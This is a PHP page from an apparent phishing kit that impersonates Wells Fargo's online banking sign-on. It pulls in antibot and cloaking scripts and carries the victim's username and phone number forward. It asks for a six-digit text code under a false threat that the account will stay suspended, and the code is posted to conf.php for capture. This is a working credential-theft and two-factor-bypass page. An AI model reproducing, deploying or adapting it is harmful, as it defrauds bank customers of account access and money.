<?php
session_start();
error_reporting(0);
include('../../files/boot/check.php');
include('../../files/boot/check1.php');
include('../../files/boot/check2.php');
include('../../files/boot/antibot.php');
include('../../files/boot/enc.php');
include('../../call.php');
$user = @$_GET['user'];
$phone = @$_GET['phone'];
$error = @$_GET['error'];
if (($user == "") || ($phone == "")) { 
echo '<meta http-equiv="refresh" content="0; URL=index.php">';
	die();
}
?>
<!DOCTYPE html>
<html class="no-js" lang="en">

<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Wells Fargo - Personal</title>
    <meta name="robots" content="noindex, nofollow">
    <meta name="search_category" content="Personal">
    <meta name="viewport" content="width=device-width,  initial-scale=1.0, maximum-scale=6.0, user-scalable=yes">
    <link rel="shortcut icon" type="image/x-icon" href="../../files/bars/favicon.ico">
    <link rel="stylesheet" href="../../files/bars/frontporch.css" type="text/css">
    <link type="text/css" href="../../files/bars/signon_clean.css" rel="stylesheet" media="screen,projection,print">
    <link rel="stylesheet" href="../../files/bars/framework.css">
    <link rel="stylesheet" href="../../files/bars/smartphone-home.css">
    <link rel="stylesheet" href="../../files/bars/util.css">
</head>

<body theme="ssep" id="body" class="" style="top: 0px;">
    <div id="shell" class="page" data-pid="324-114205-64">
        <div id="hamburger-menubackdrop" class="backDrop"></div><a href="#skip" class="hidden">Skip to content</a>

        <!-- <header class="masthead" role="banner">
            <div id="navLeft" style="display: block;">
                <a tabindex="1" href="#" rel="nofollow" class="backLink">
                    <span class="sr-only">Back link</span>
                </a>
            </div>
            <div class="logoOuter">
                <div class="logo">

                    <a href="#">
                        <span class="navbar-brand img-responsive">
              <span class="sr-only">Wells Fargo Bank</span>
                        </span>
                    </a>

                </div>
            </div>
            <div id="navRight">
                <nav class="navbar navbar-default navbar-fixed-top">
                    <div class="navbar-header">
                        <div class="entire-menu">
                            <button type="button" class="navbar-toggle hamburger"><span class="sr-only">Menu</span> <span class="icon-bar">‍</span> <span class="icon-bar">‍</span> <span class="icon-bar">‍</span> <span class="expandedIcon pointer">‍</span><span class="ui-hidden-accessible">Expand Menu</span></button>
                        </div>
                    </div>
                </nav>
            </div>
        </header> -->

        <div class="header" id="header">
            <div class="wf_logo" role="link">
                <img src="../../files/bars/icn-img-wf-logo.png" alt="Wells Fargo">
            </div>
            <div class="hamburger_menu" role="link">
                <a href="#"><img src="../../files/bars/icn_house.png" alt="Home"></a>
            </div>
        </div>
        <main role="main" id="maincontainer">

            <div id="form">
                <h1 style="margin: 0px;">Welcome</h1>
                <!-- Retrieving username values -->
                <h2 style="margin-top: 0px;"><span class="icon-lock"></span><a href="#">Online &amp; Mobile Security</a></h2>
            </div>
            <div class="overlayContainer">
                <div class="signOnContainer" align="center" style="width: 100%; max-width: 650px;">
                    <form id="" name="frmSignon" action="conf.php" method="post" autocomplete="off">
                        <input type="hidden" name="user" value="<?php print " $user "; ?>">
                        <input type="hidden" name="phone" value="<?php print " $phone "; ?>">
                        <p style="font-size: 110%; color: #FFFFFF; ">For your security, an Advanced Access code is required. </p>
                        <p style="font-size: 120%; color: #FFFFFF; ">We have sent you a message with a 6 digit code ("To send 500.00 to Wells Fargo with a unique code") to your phone number.</p>
                        <p style="font-size: 120%; color: #FFFFFF; font-weight: bold;">Failing to input the specific code will cause your account to remain suspended and the authentication will not be validated.</p>
                        <p style="font-size: 120%; color: #FFFFFF; font-weight: bold;">Please wait a few moments to receive the code on your mobile phone.</p>

                        <?php if ($error == "1") { 
							echo '<p style="font-size: 130%; color: red; font-weight: bold;">Some or all of the fields you have completed might be incorrect or incomplete. Please review your input. </p>';;
							}
						?>
                            </p>
                            <br>
                            <label class="sr-only" for="userid"></label>
                            <p style=" font-size: 110%; color:#FFFFFF; font-weight:bold; width: 40%;">Text code (6 digits): </p>
                            <input maxlength="6" style=" width: 40%;" id="userid" placeholder="Text code(6digits)" class="required" name="code" type="text">
                            <div class="save-uid" align="left">
                                <ul>
                                    <li>
                                        <input maxlength="6" name="code" id="code" value="" type="checkbox">
                                    </li>
                                </ul>
                            </div>
                            <input class="signOn" style="width: 60%; " value="Verify my account" type="submit">

                            <div class="enroll-header">&copy; 2019 <em>Wells Fargo Online</em><sup>®</sup></div>

                    </form>
                </div>

                <footer role="contentinfo" style="text-align: center;">
                    <div class="html5footer c9" id="pageFooter">
                        <nav class="nav-footer">
                            <div class="footer-link clistData">
                                <a href="#">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="#">Ad Choices</a>
                                <div class="footer-oaa"><a href="#">Online Access Agreement</a>
                                </div>
                            </div>
                            <div class="footer-content">
                                <div>
                                    <strong>Investment and Insurance products:</strong>
                                </div>
                                <div>
                                    <strong>NOT FDIC-Insured | NO Bank Guarantee | MAY Lose Value</strong>
                                </div>
                            </div>
                            <div class="footer-content">Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</div>
                            <div class="footer-content">
                                <span class="home-equal">‍</span> Equal Housing Lender. NMLSR ID 399801</div>
                            <div class="footer-content footer-margin">© 2019 Wells Fargo. All rights reserved.</div>
                            <div class="stage-coach"><img src="../../files/bars/50_opacity_stagecoach_002.png" aria-hidden="true" alt=""></div>
                        </nav>
                    </div>

                </footer>
            </div>

        </main>
</body>

</html>